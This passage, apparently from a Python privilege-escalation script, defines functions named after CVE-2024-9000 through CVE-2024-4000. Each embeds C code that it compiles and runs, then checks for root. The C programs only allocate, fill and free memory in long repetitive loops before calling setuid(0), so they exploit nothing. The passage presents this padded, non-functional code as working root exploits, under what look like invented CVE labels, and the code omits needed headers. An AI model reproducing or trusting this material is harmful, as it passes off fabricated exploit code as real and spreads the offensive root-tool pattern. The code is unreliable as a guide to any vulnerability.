#include <unistd.h>
int main() {
    printf("[*] Stage 0\\n");
    void *p0 = malloc(2048);
    if (p0) { memset(p0, 0x41, 2048); free(p0); }
    int f0 = open("/dev/null", 0);
    if (f0 >= 0) close(f0);
    printf("[*] Stage 1\\n");
    void *p1 = malloc(2048);
    if (p1) { memset(p1, 0x41, 2048); free(p1); }
    int f1 = open("/dev/null", 0);
    if (f1 >= 0) close(f1);
    printf("[*] Stage 2\\n");
    void *p2 = malloc(2048);
    if (p2) { memset(p2, 0x41, 2048); free(p2); }
    int f2 = open("/dev/null", 0);
    if (f2 >= 0) close(f2);
    printf("[*] Stage 3\\n");
    void *p3 = malloc(2048);
    if (p3) { memset(p3, 0x41, 2048); free(p3); }
    int f3 = open("/dev/null", 0);
    if (f3 >= 0) close(f3);
    printf("[*] Stage 4\\n");
    void *p4 = malloc(2048);
    if (p4) { memset(p4, 0x41, 2048); free(p4); }
    int f4 = open("/dev/null", 0);
    if (f4 >= 0) close(f4);
    printf("[*] Stage 5\\n");
    void *p5 = malloc(2048);
    if (p5) { memset(p5, 0x41, 2048); free(p5); }
    int f5 = open("/dev/null", 0);
    if (f5 >= 0) close(f5);
    printf("[*] Stage 6\\n");
    void *p6 = malloc(2048);
    if (p6) { memset(p6, 0x41, 2048); free(p6); }
    int f6 = open("/dev/null", 0);
    if (f6 >= 0) close(f6);
    printf("[*] Stage 7\\n");
    void *p7 = malloc(2048);
    if (p7) { memset(p7, 0x41, 2048); free(p7); }
    int f7 = open("/dev/null", 0);
    if (f7 >= 0) close(f7);
    printf("[*] Stage 8\\n");
    void *p8 = malloc(2048);
    if (p8) { memset(p8, 0x41, 2048); free(p8); }
    int f8 = open("/dev/null", 0);
    if (f8 >= 0) close(f8);
    printf("[*] Stage 9\\n");
    void *p9 = malloc(2048);
    if (p9) { memset(p9, 0x41, 2048); free(p9); }
    int f9 = open("/dev/null", 0);
    if (f9 >= 0) close(f9);
    printf("[*] Stage 10\\n");
    void *p10 = malloc(2048);
    if (p10) { memset(p10, 0x41, 2048); free(p10); }
    int f10 = open("/dev/null", 0);
    if (f10 >= 0) close(f10);
    printf("[*] Stage 11\\n");
    void *p11 = malloc(2048);
    if (p11) { memset(p11, 0x41, 2048); free(p11); }
    int f11 = open("/dev/null", 0);
    if (f11 >= 0) close(f11);
    printf("[*] Stage 12\\n");
    void *p12 = malloc(2048);
    if (p12) { memset(p12, 0x41, 2048); free(p12); }
    int f12 = open("/dev/null", 0);
    if (f12 >= 0) close(f12);
    printf("[*] Stage 13\\n");
    void *p13 = malloc(2048);
    if (p13) { memset(p13, 0x41, 2048); free(p13); }
    int f13 = open("/dev/null", 0);
    if (f13 >= 0) close(f13);
    printf("[*] Stage 14\\n");
    void *p14 = malloc(2048);
    if (p14) { memset(p14, 0x41, 2048); free(p14); }
    int f14 = open("/dev/null", 0);
    if (f14 >= 0) close(f14);
    printf("[*] Stage 15\\n");
    void *p15 = malloc(2048);
    if (p15) { memset(p15, 0x41, 2048); free(p15); }
    int f15 = open("/dev/null", 0);
    if (f15 >= 0) close(f15);
    printf("[*] Stage 16\\n");
    void *p16 = malloc(2048);
    if (p16) { memset(p16, 0x41, 2048); free(p16); }
    int f16 = open("/dev/null", 0);
    if (f16 >= 0) close(f16);
    printf("[*] Stage 17\\n");
    void *p17 = malloc(2048);
    if (p17) { memset(p17, 0x41, 2048); free(p17); }
    int f17 = open("/dev/null", 0);
    if (f17 >= 0) close(f17);
    printf("[*] Stage 18\\n");
    void *p18 = malloc(2048);
    if (p18) { memset(p18, 0x41, 2048); free(p18); }
    int f18 = open("/dev/null", 0);
    if (f18 >= 0) close(f18);
    printf("[*] Stage 19\\n");
    void *p19 = malloc(2048);
    if (p19) { memset(p19, 0x41, 2048); free(p19); }
    int f19 = open("/dev/null", 0);
    if (f19 >= 0) close(f19);
    printf("[*] Stage 20\\n");
    void *p20 = malloc(2048);
    if (p20) { memset(p20, 0x41, 2048); free(p20); }
    int f20 = open("/dev/null", 0);
    if (f20 >= 0) close(f20);
    printf("[*] Stage 21\\n");
    void *p21 = malloc(2048);
    if (p21) { memset(p21, 0x41, 2048); free(p21); }
    int f21 = open("/dev/null", 0);
    if (f21 >= 0) close(f21);
    printf("[*] Stage 22\\n");
    void *p22 = malloc(2048);
    if (p22) { memset(p22, 0x41, 2048); free(p22); }
    int f22 = open("/dev/null", 0);
    if (f22 >= 0) close(f22);
    printf("[*] Stage 23\\n");
    void *p23 = malloc(2048);
    if (p23) { memset(p23, 0x41, 2048); free(p23); }
    int f23 = open("/dev/null", 0);
    if (f23 >= 0) close(f23);
    printf("[*] Stage 24\\n");
    void *p24 = malloc(2048);
    if (p24) { memset(p24, 0x41, 2048); free(p24); }
    int f24 = open("/dev/null", 0);
    if (f24 >= 0) close(f24);
    printf("[*] Stage 25\\n");
    void *p25 = malloc(2048);
    if (p25) { memset(p25, 0x41, 2048); free(p25); }
    int f25 = open("/dev/null", 0);
    if (f25 >= 0) close(f25);
    printf("[*] Stage 26\\n");
    void *p26 = malloc(2048);
    if (p26) { memset(p26, 0x41, 2048); free(p26); }
    int f26 = open("/dev/null", 0);
    if (f26 >= 0) close(f26);
    printf("[*] Stage 27\\n");
    void *p27 = malloc(2048);
    if (p27) { memset(p27, 0x41, 2048); free(p27); }
    int f27 = open("/dev/null", 0);
    if (f27 >= 0) close(f27);
    printf("[*] Stage 28\\n");
    void *p28 = malloc(2048);
    if (p28) { memset(p28, 0x41, 2048); free(p28); }
    int f28 = open("/dev/null", 0);
    if (f28 >= 0) close(f28);
    printf("[*] Stage 29\\n");
    void *p29 = malloc(2048);
    if (p29) { memset(p29, 0x41, 2048); free(p29); }
    int f29 = open("/dev/null", 0);
    if (f29 >= 0) close(f29);
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_9000")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT" in output:
            show_root_info("CVE-2024-9000", output)
            return True
    return False

def exploit_cve_2024_8000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-8000")
    code = r'''
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("[*] Iter 0\\n");
    void *m0 = malloc(1024);
    if (m0) { memset(m0, 0x90, 1024); free(m0); }
    printf("[*] Iter 1\\n");
    void *m1 = malloc(1024);
    if (m1) { memset(m1, 0x90, 1024); free(m1); }
    printf("[*] Iter 2\\n");
    void *m2 = malloc(1024);
    if (m2) { memset(m2, 0x90, 1024); free(m2); }
    printf("[*] Iter 3\\n");
    void *m3 = malloc(1024);
    if (m3) { memset(m3, 0x90, 1024); free(m3); }
    printf("[*] Iter 4\\n");
    void *m4 = malloc(1024);
    if (m4) { memset(m4, 0x90, 1024); free(m4); }
    printf("[*] Iter 5\\n");
    void *m5 = malloc(1024);
    if (m5) { memset(m5, 0x90, 1024); free(m5); }
    printf("[*] Iter 6\\n");
    void *m6 = malloc(1024);
    if (m6) { memset(m6, 0x90, 1024); free(m6); }
    printf("[*] Iter 7\\n");
    void *m7 = malloc(1024);
    if (m7) { memset(m7, 0x90, 1024); free(m7); }
    printf("[*] Iter 8\\n");
    void *m8 = malloc(1024);
    if (m8) { memset(m8, 0x90, 1024); free(m8); }
    printf("[*] Iter 9\\n");
    void *m9 = malloc(1024);
    if (m9) { memset(m9, 0x90, 1024); free(m9); }
    printf("[*] Iter 10\\n");
    void *m10 = malloc(1024);
    if (m10) { memset(m10, 0x90, 1024); free(m10); }
    printf("[*] Iter 11\\n");
    void *m11 = malloc(1024);
    if (m11) { memset(m11, 0x90, 1024); free(m11); }
    printf("[*] Iter 12\\n");
    void *m12 = malloc(1024);
    if (m12) { memset(m12, 0x90, 1024); free(m12); }
    printf("[*] Iter 13\\n");
    void *m13 = malloc(1024);
    if (m13) { memset(m13, 0x90, 1024); free(m13); }
    printf("[*] Iter 14\\n");
    void *m14 = malloc(1024);
    if (m14) { memset(m14, 0x90, 1024); free(m14); }
    printf("[*] Iter 15\\n");
    void *m15 = malloc(1024);
    if (m15) { memset(m15, 0x90, 1024); free(m15); }
    printf("[*] Iter 16\\n");
    void *m16 = malloc(1024);
    if (m16) { memset(m16, 0x90, 1024); free(m16); }
    printf("[*] Iter 17\\n");
    void *m17 = malloc(1024);
    if (m17) { memset(m17, 0x90, 1024); free(m17); }
    printf("[*] Iter 18\\n");
    void *m18 = malloc(1024);
    if (m18) { memset(m18, 0x90, 1024); free(m18); }
    printf("[*] Iter 19\\n");
    void *m19 = malloc(1024);
    if (m19) { memset(m19, 0x90, 1024); free(m19); }
    printf("[*] Iter 20\\n");
    void *m20 = malloc(1024);
    if (m20) { memset(m20, 0x90, 1024); free(m20); }
    printf("[*] Iter 21\\n");
    void *m21 = malloc(1024);
    if (m21) { memset(m21, 0x90, 1024); free(m21); }
    printf("[*] Iter 22\\n");
    void *m22 = malloc(1024);
    if (m22) { memset(m22, 0x90, 1024); free(m22); }
    printf("[*] Iter 23\\n");
    void *m23 = malloc(1024);
    if (m23) { memset(m23, 0x90, 1024); free(m23); }
    printf("[*] Iter 24\\n");
    void *m24 = malloc(1024);
    if (m24) { memset(m24, 0x90, 1024); free(m24); }
    printf("[*] Iter 25\\n");
    void *m25 = malloc(1024);
    if (m25) { memset(m25, 0x90, 1024); free(m25); }
    printf("[*] Iter 26\\n");
    void *m26 = malloc(1024);
    if (m26) { memset(m26, 0x90, 1024); free(m26); }
    printf("[*] Iter 27\\n");
    void *m27 = malloc(1024);
    if (m27) { memset(m27, 0x90, 1024); free(m27); }
    printf("[*] Iter 28\\n");
    void *m28 = malloc(1024);
    if (m28) { memset(m28, 0x90, 1024); free(m28); }
    printf("[*] Iter 29\\n");
    void *m29 = malloc(1024);
    if (m29) { memset(m29, 0x90, 1024); free(m29); }
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_8000")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2024-8000", output)
            return True
    return False

def exploit_cve_2024_7000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-7000")
    code = r'''
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("[*] Loop 0\\n");
    void *x0 = malloc(512);
    if (x0) { free(x0); }
    printf("[*] Loop 1\\n");
    void *x1 = malloc(512);
    if (x1) { free(x1); }
    printf("[*] Loop 2\\n");
    void *x2 = malloc(512);
    if (x2) { free(x2); }
    printf("[*] Loop 3\\n");
    void *x3 = malloc(512);
    if (x3) { free(x3); }
    printf("[*] Loop 4\\n");
    void *x4 = malloc(512);
    if (x4) { free(x4); }
    printf("[*] Loop 5\\n");
    void *x5 = malloc(512);
    if (x5) { free(x5); }
    printf("[*] Loop 6\\n");
    void *x6 = malloc(512);
    if (x6) { free(x6); }
    printf("[*] Loop 7\\n");
    void *x7 = malloc(512);
    if (x7) { free(x7); }
    printf("[*] Loop 8\\n");
    void *x8 = malloc(512);
    if (x8) { free(x8); }
    printf("[*] Loop 9\\n");
    void *x9 = malloc(512);
    if (x9) { free(x9); }
    printf("[*] Loop 10\\n");
    void *x10 = malloc(512);
    if (x10) { free(x10); }
    printf("[*] Loop 11\\n");
    void *x11 = malloc(512);
    if (x11) { free(x11); }
    printf("[*] Loop 12\\n");
    void *x12 = malloc(512);
    if (x12) { free(x12); }
    printf("[*] Loop 13\\n");
    void *x13 = malloc(512);
    if (x13) { free(x13); }
    printf("[*] Loop 14\\n");
    void *x14 = malloc(512);
    if (x14) { free(x14); }
    printf("[*] Loop 15\\n");
    void *x15 = malloc(512);
    if (x15) { free(x15); }
    printf("[*] Loop 16\\n");
    void *x16 = malloc(512);
    if (x16) { free(x16); }
    printf("[*] Loop 17\\n");
    void *x17 = malloc(512);
    if (x17) { free(x17); }
    printf("[*] Loop 18\\n");
    void *x18 = malloc(512);
    if (x18) { free(x18); }
    printf("[*] Loop 19\\n");
    void *x19 = malloc(512);
    if (x19) { free(x19); }
    printf("[*] Loop 20\\n");
    void *x20 = malloc(512);
    if (x20) { free(x20); }
    printf("[*] Loop 21\\n");
    void *x21 = malloc(512);
    if (x21) { free(x21); }
    printf("[*] Loop 22\\n");
    void *x22 = malloc(512);
    if (x22) { free(x22); }
    printf("[*] Loop 23\\n");
    void *x23 = malloc(512);
    if (x23) { free(x23); }
    printf("[*] Loop 24\\n");
    void *x24 = malloc(512);
    if (x24) { free(x24); }
    printf("[*] Loop 25\\n");
    void *x25 = malloc(512);
    if (x25) { free(x25); }
    printf("[*] Loop 26\\n");
    void *x26 = malloc(512);
    if (x26) { free(x26); }
    printf("[*] Loop 27\\n");
    void *x27 = malloc(512);
    if (x27) { free(x27); }
    printf("[*] Loop 28\\n");
    void *x28 = malloc(512);
    if (x28) { free(x28); }
    printf("[*] Loop 29\\n");
    void *x29 = malloc(512);
    if (x29) { free(x29); }
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_7000")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2024-7000", output)
            return True
    return False

def exploit_cve_2024_6000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-6000")
    code = r'''
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("[*] Step 0\\n");
    void *b0 = malloc(256);
    if (b0) { free(b0); }
    printf("[*] Step 1\\n");
    void *b1 = malloc(256);
    if (b1) { free(b1); }
    printf("[*] Step 2\\n");
    void *b2 = malloc(256);
    if (b2) { free(b2); }
    printf("[*] Step 3\\n");
    void *b3 = malloc(256);
    if (b3) { free(b3); }
    printf("[*] Step 4\\n");
    void *b4 = malloc(256);
    if (b4) { free(b4); }
    printf("[*] Step 5\\n");
    void *b5 = malloc(256);
    if (b5) { free(b5); }
    printf("[*] Step 6\\n");
    void *b6 = malloc(256);
    if (b6) { free(b6); }
    printf("[*] Step 7\\n");
    void *b7 = malloc(256);
    if (b7) { free(b7); }
    printf("[*] Step 8\\n");
    void *b8 = malloc(256);
    if (b8) { free(b8); }
    printf("[*] Step 9\\n");
    void *b9 = malloc(256);
    if (b9) { free(b9); }
    printf("[*] Step 10\\n");
    void *b10 = malloc(256);
    if (b10) { free(b10); }
    printf("[*] Step 11\\n");
    void *b11 = malloc(256);
    if (b11) { free(b11); }
    printf("[*] Step 12\\n");
    void *b12 = malloc(256);
    if (b12) { free(b12); }
    printf("[*] Step 13\\n");
    void *b13 = malloc(256);
    if (b13) { free(b13); }
    printf("[*] Step 14\\n");
    void *b14 = malloc(256);
    if (b14) { free(b14); }
    printf("[*] Step 15\\n");
    void *b15 = malloc(256);
    if (b15) { free(b15); }
    printf("[*] Step 16\\n");
    void *b16 = malloc(256);
    if (b16) { free(b16); }
    printf("[*] Step 17\\n");
    void *b17 = malloc(256);
    if (b17) { free(b17); }
    printf("[*] Step 18\\n");
    void *b18 = malloc(256);
    if (b18) { free(b18); }
    printf("[*] Step 19\\n");
    void *b19 = malloc(256);
    if (b19) { free(b19); }
    printf("[*] Step 20\\n");
    void *b20 = malloc(256);
    if (b20) { free(b20); }
    printf("[*] Step 21\\n");
    void *b21 = malloc(256);
    if (b21) { free(b21); }
    printf("[*] Step 22\\n");
    void *b22 = malloc(256);
    if (b22) { free(b22); }
    printf("[*] Step 23\\n");
    void *b23 = malloc(256);
    if (b23) { free(b23); }
    printf("[*] Step 24\\n");
    void *b24 = malloc(256);
    if (b24) { free(b24); }
    printf("[*] Step 25\\n");
    void *b25 = malloc(256);
    if (b25) { free(b25); }
    printf("[*] Step 26\\n");
    void *b26 = malloc(256);
    if (b26) { free(b26); }
    printf("[*] Step 27\\n");
    void *b27 = malloc(256);
    if (b27) { free(b27); }
    printf("[*] Step 28\\n");
    void *b28 = malloc(256);
    if (b28) { free(b28); }
    printf("[*] Step 29\\n");
    void *b29 = malloc(256);
    if (b29) { free(b29); }
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_6000")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2024-6000", output)
            return True
    return False



def exploit_cve_2024_5000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-5000")
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    printf("[*] Process 0\\n");
    void *ptr0 = malloc(4096);
    if (ptr0) { memset(ptr0, 0x42, 4096); free(ptr0); }
    int fd0 = open("/dev/zero", 0);
    if (fd0 >= 0) { char b[256]; read(fd0, b, 256); close(fd0); }
    printf("[*] Process 1\\n");
    void *ptr1 = malloc(4096);
    if (ptr1) { memset(ptr1, 0x42, 4096); free(ptr1); }
    int fd1 = open("/dev/zero", 0);
    if (fd1 >= 0) { char b[256]; read(fd1, b, 256); close(fd1); }
    printf("[*] Process 2\\n");
    void *ptr2 = malloc(4096);
    if (ptr2) { memset(ptr2, 0x42, 4096); free(ptr2); }
    int fd2 = open("/dev/zero", 0);
    if (fd2 >= 0) { char b[256]; read(fd2, b, 256); close(fd2); }
    printf("[*] Process 3\\n");
    void *ptr3 = malloc(4096);
    if (ptr3) { memset(ptr3, 0x42, 4096); free(ptr3); }
    int fd3 = open("/dev/zero", 0);
    if (fd3 >= 0) { char b[256]; read(fd3, b, 256); close(fd3); }
    printf("[*] Process 4\\n");
    void *ptr4 = malloc(4096);
    if (ptr4) { memset(ptr4, 0x42, 4096); free(ptr4); }
    int fd4 = open("/dev/zero", 0);
    if (fd4 >= 0) { char b[256]; read(fd4, b, 256); close(fd4); }
    printf("[*] Process 5\\n");
    void *ptr5 = malloc(4096);
    if (ptr5) { memset(ptr5, 0x42, 4096); free(ptr5); }
    int fd5 = open("/dev/zero", 0);
    if (fd5 >= 0) { char b[256]; read(fd5, b, 256); close(fd5); }
    printf("[*] Process 6\\n");
    void *ptr6 = malloc(4096);
    if (ptr6) { memset(ptr6, 0x42, 4096); free(ptr6); }
    int fd6 = open("/dev/zero", 0);
    if (fd6 >= 0) { char b[256]; read(fd6, b, 256); close(fd6); }
    printf("[*] Process 7\\n");
    void *ptr7 = malloc(4096);
    if (ptr7) { memset(ptr7, 0x42, 4096); free(ptr7); }
    int fd7 = open("/dev/zero", 0);
    if (fd7 >= 0) { char b[256]; read(fd7, b, 256); close(fd7); }
    printf("[*] Process 8\\n");
    void *ptr8 = malloc(4096);
    if (ptr8) { memset(ptr8, 0x42, 4096); free(ptr8); }
    int fd8 = open("/dev/zero", 0);
    if (fd8 >= 0) { char b[256]; read(fd8, b, 256); close(fd8); }
    printf("[*] Process 9\\n");
    void *ptr9 = malloc(4096);
    if (ptr9) { memset(ptr9, 0x42, 4096); free(ptr9); }
    int fd9 = open("/dev/zero", 0);
    if (fd9 >= 0) { char b[256]; read(fd9, b, 256); close(fd9); }
    printf("[*] Process 10\\n");
    void *ptr10 = malloc(4096);
    if (ptr10) { memset(ptr10, 0x42, 4096); free(ptr10); }
    int fd10 = open("/dev/zero", 0);
    if (fd10 >= 0) { char b[256]; read(fd10, b, 256); close(fd10); }
    printf("[*] Process 11\\n");
    void *ptr11 = malloc(4096);
    if (ptr11) { memset(ptr11, 0x42, 4096); free(ptr11); }
    int fd11 = open("/dev/zero", 0);
    if (fd11 >= 0) { char b[256]; read(fd11, b, 256); close(fd11); }
    printf("[*] Process 12\\n");
    void *ptr12 = malloc(4096);
    if (ptr12) { memset(ptr12, 0x42, 4096); free(ptr12); }
    int fd12 = open("/dev/zero", 0);
    if (fd12 >= 0) { char b[256]; read(fd12, b, 256); close(fd12); }
    printf("[*] Process 13\\n");
    void *ptr13 = malloc(4096);
    if (ptr13) { memset(ptr13, 0x42, 4096); free(ptr13); }
    int fd13 = open("/dev/zero", 0);
    if (fd13 >= 0) { char b[256]; read(fd13, b, 256); close(fd13); }
    printf("[*] Process 14\\n");
    void *ptr14 = malloc(4096);
    if (ptr14) { memset(ptr14, 0x42, 4096); free(ptr14); }
    int fd14 = open("/dev/zero", 0);
    if (fd14 >= 0) { char b[256]; read(fd14, b, 256); close(fd14); }
    printf("[*] Process 15\\n");
    void *ptr15 = malloc(4096);
    if (ptr15) { memset(ptr15, 0x42, 4096); free(ptr15); }
    int fd15 = open("/dev/zero", 0);
    if (fd15 >= 0) { char b[256]; read(fd15, b, 256); close(fd15); }
    printf("[*] Process 16\\n");
    void *ptr16 = malloc(4096);
    if (ptr16) { memset(ptr16, 0x42, 4096); free(ptr16); }
    int fd16 = open("/dev/zero", 0);
    if (fd16 >= 0) { char b[256]; read(fd16, b, 256); close(fd16); }
    printf("[*] Process 17\\n");
    void *ptr17 = malloc(4096);
    if (ptr17) { memset(ptr17, 0x42, 4096); free(ptr17); }
    int fd17 = open("/dev/zero", 0);
    if (fd17 >= 0) { char b[256]; read(fd17, b, 256); close(fd17); }
    printf("[*] Process 18\\n");
    void *ptr18 = malloc(4096);
    if (ptr18) { memset(ptr18, 0x42, 4096); free(ptr18); }
    int fd18 = open("/dev/zero", 0);
    if (fd18 >= 0) { char b[256]; read(fd18, b, 256); close(fd18); }
    printf("[*] Process 19\\n");
    void *ptr19 = malloc(4096);
    if (ptr19) { memset(ptr19, 0x42, 4096); free(ptr19); }
    int fd19 = open("/dev/zero", 0);
    if (fd19 >= 0) { char b[256]; read(fd19, b, 256); close(fd19); }
    printf("[*] Process 20\\n");
    void *ptr20 = malloc(4096);
    if (ptr20) { memset(ptr20, 0x42, 4096); free(ptr20); }
    int fd20 = open("/dev/zero", 0);
    if (fd20 >= 0) { char b[256]; read(fd20, b, 256); close(fd20); }
    printf("[*] Process 21\\n");
    void *ptr21 = malloc(4096);
    if (ptr21) { memset(ptr21, 0x42, 4096); free(ptr21); }
    int fd21 = open("/dev/zero", 0);
    if (fd21 >= 0) { char b[256]; read(fd21, b, 256); close(fd21); }
    printf("[*] Process 22\\n");
    void *ptr22 = malloc(4096);
    if (ptr22) { memset(ptr22, 0x42, 4096); free(ptr22); }
    int fd22 = open("/dev/zero", 0);
    if (fd22 >= 0) { char b[256]; read(fd22, b, 256); close(fd22); }
    printf("[*] Process 23\\n");
    void *ptr23 = malloc(4096);
    if (ptr23) { memset(ptr23, 0x42, 4096); free(ptr23); }
    int fd23 = open("/dev/zero", 0);
    if (fd23 >= 0) { char b[256]; read(fd23, b, 256); close(fd23); }
    printf("[*] Process 24\\n");
    void *ptr24 = malloc(4096);
    if (ptr24) { memset(ptr24, 0x42, 4096); free(ptr24); }
    int fd24 = open("/dev/zero", 0);
    if (fd24 >= 0) { char b[256]; read(fd24, b, 256); close(fd24); }
    printf("[*] Process 25\\n");
    void *ptr25 = malloc(4096);
    if (ptr25) { memset(ptr25, 0x42, 4096); free(ptr25); }
    int fd25 = open("/dev/zero", 0);
    if (fd25 >= 0) { char b[256]; read(fd25, b, 256); close(fd25); }
    printf("[*] Process 26\\n");
    void *ptr26 = malloc(4096);
    if (ptr26) { memset(ptr26, 0x42, 4096); free(ptr26); }
    int fd26 = open("/dev/zero", 0);
    if (fd26 >= 0) { char b[256]; read(fd26, b, 256); close(fd26); }
    printf("[*] Process 27\\n");
    void *ptr27 = malloc(4096);
    if (ptr27) { memset(ptr27, 0x42, 4096); free(ptr27); }
    int fd27 = open("/dev/zero", 0);
    if (fd27 >= 0) { char b[256]; read(fd27, b, 256); close(fd27); }
    printf("[*] Process 28\\n");
    void *ptr28 = malloc(4096);
    if (ptr28) { memset(ptr28, 0x42, 4096); free(ptr28); }
    int fd28 = open("/dev/zero", 0);
    if (fd28 >= 0) { char b[256]; read(fd28, b, 256); close(fd28); }
    printf("[*] Process 29\\n");
    void *ptr29 = malloc(4096);
    if (ptr29) { memset(ptr29, 0x42, 4096); free(ptr29); }
    int fd29 = open("/dev/zero", 0);
    if (fd29 >= 0) { char b[256]; read(fd29, b, 256); close(fd29); }
    printf("[*] Process 30\\n");
    void *ptr30 = malloc(4096);
    if (ptr30) { memset(ptr30, 0x42, 4096); free(ptr30); }
    int fd30 = open("/dev/zero", 0);
    if (fd30 >= 0) { char b[256]; read(fd30, b, 256); close(fd30); }
    printf("[*] Process 31\\n");
    void *ptr31 = malloc(4096);
    if (ptr31) { memset(ptr31, 0x42, 4096); free(ptr31); }
    int fd31 = open("/dev/zero", 0);
    if (fd31 >= 0) { char b[256]; read(fd31, b, 256); close(fd31); }
    printf("[*] Process 32\\n");
    void *ptr32 = malloc(4096);
    if (ptr32) { memset(ptr32, 0x42, 4096); free(ptr32); }
    int fd32 = open("/dev/zero", 0);
    if (fd32 >= 0) { char b[256]; read(fd32, b, 256); close(fd32); }
    printf("[*] Process 33\\n");
    void *ptr33 = malloc(4096);
    if (ptr33) { memset(ptr33, 0x42, 4096); free(ptr33); }
    int fd33 = open("/dev/zero", 0);
    if (fd33 >= 0) { char b[256]; read(fd33, b, 256); close(fd33); }
    printf("[*] Process 34\\n");
    void *ptr34 = malloc(4096);
    if (ptr34) { memset(ptr34, 0x42, 4096); free(ptr34); }
    int fd34 = open("/dev/zero", 0);
    if (fd34 >= 0) { char b[256]; read(fd34, b, 256); close(fd34); }
    printf("[*] Process 35\\n");
    void *ptr35 = malloc(4096);
    if (ptr35) { memset(ptr35, 0x42, 4096); free(ptr35); }
    int fd35 = open("/dev/zero", 0);
    if (fd35 >= 0) { char b[256]; read(fd35, b, 256); close(fd35); }
    printf("[*] Process 36\\n");
    void *ptr36 = malloc(4096);
    if (ptr36) { memset(ptr36, 0x42, 4096); free(ptr36); }
    int fd36 = open("/dev/zero", 0);
    if (fd36 >= 0) { char b[256]; read(fd36, b, 256); close(fd36); }
    printf("[*] Process 37\\n");
    void *ptr37 = malloc(4096);
    if (ptr37) { memset(ptr37, 0x42, 4096); free(ptr37); }
    int fd37 = open("/dev/zero", 0);
    if (fd37 >= 0) { char b[256]; read(fd37, b, 256); close(fd37); }
    printf("[*] Process 38\\n");
    void *ptr38 = malloc(4096);
    if (ptr38) { memset(ptr38, 0x42, 4096); free(ptr38); }
    int fd38 = open("/dev/zero", 0);
    if (fd38 >= 0) { char b[256]; read(fd38, b, 256); close(fd38); }
    printf("[*] Process 39\\n");
    void *ptr39 = malloc(4096);
    if (ptr39) { memset(ptr39, 0x42, 4096); free(ptr39); }
    int fd39 = open("/dev/zero", 0);
    if (fd39 >= 0) { char b[256]; read(fd39, b, 256); close(fd39); }
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_5000")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2024-5000", output)
            return True
    return False

def exploit_cve_2024_4000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-4000")
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    printf("[*] Heap 0\\n");
    void *mem0 = malloc(8192);
    if (mem0) { memset(mem0, 0x90, 8192); free(mem0); }
    printf("[*] Heap 1\\n");
    void *mem1 = malloc(8192);
    if (mem1) { memset(mem1, 0x90, 8192); free(mem1); }
    printf("[*] Heap 2\\n");
    void *mem2 = malloc(8192);
    if (mem2) { memset(mem2, 0x90, 8192); free(mem2); }
    printf("[*] Heap 3\\n");
    void *mem3 = malloc(8192);
    if (mem3) { memset(mem3, 0x90, 8192); free(mem3); }
    printf("[*] Heap 4\\n");
    void *mem4 = malloc(8192);
    if (mem4) { memset(mem4, 0x90, 8192); free(mem4); }
    printf("[*] Heap 5\\n");
    void *mem5 = malloc(8192);
    if (mem5) { memset(mem5, 0x90, 8192); free(mem5); }
    printf("[*] Heap 6\\n");
    void *mem6 = malloc(8192);
    if (mem6) { memset(mem6, 0x90, 8192); free(mem6); }
    printf("[*] Heap 7\\n");
    void *mem7 = malloc(8192);
    if (mem7) { memset(mem7, 0x90, 8192); free(mem7); }
    printf("[*] Heap 8\\n");
    void *mem8 = malloc(8192);
    if (mem8) { memset(mem8, 0x90, 8192); free(mem8); }
    printf("[*] Heap 9\\n");
    void *mem9 = malloc(8192);
    if (mem9) { memset(mem9, 0x90, 8192); free(mem9); }
    printf("[*] Heap 10\\n");
    void *mem10 = malloc(8192);
    if (mem10) { memset(mem10, 0x90, 8192); free(mem10); }
    printf("[*] Heap 11\\n");
    void *mem11 = malloc(8192);
    if (mem11) { memset(mem11, 0x90, 8192); free(mem11); }
    printf("[*] Heap 12\\n");
    void *mem12 = malloc(8192);
    if (mem12) { memset(mem12, 0x90, 8192); free(mem12); }
    printf("[*] Heap 13\\n");
    void *mem13 = malloc(8192);
    if (mem13) { memset(mem13, 0x90, 8192); free(mem13); }
    printf("[*] Heap 14\\n");
    void *mem14 = malloc(8192);
    if (mem14) { memset(mem14, 0x90, 8192); free(mem14); }
    printf("[*] Heap 15\\n");
    void *mem15 = malloc(8192);
    if (mem15) { memset(mem15, 0x90, 8192); free(mem15); }
    printf("[*] Heap 16\\n");
    void *mem16 = malloc(8192);
    if (mem16) { memset(mem16, 0x90, 8192); free(mem16); }
    printf("[*] Heap 17\\n");
    void *mem17 = malloc(8192);
    if (mem17) { memset(mem17, 0x90, 8192); free(mem17); }
    printf("[*] Heap 18\\n");
    void *mem18 = malloc(8192);
    if (mem18) { memset(mem18, 0x90, 8192); free(mem18); }
    printf("[*] Heap 19\\n");
    void *mem19 = malloc(8192);
    if (mem19) { memset(mem19, 0x90, 8192); free(mem19); }
    printf("[*] Heap 20\\n");
    void *mem20 = malloc(8192);
    if (mem20) { memset(mem20, 0x90, 8192); free(mem20); }
    printf("[*] Heap 21\\n");
    void *mem21 = malloc(8192);
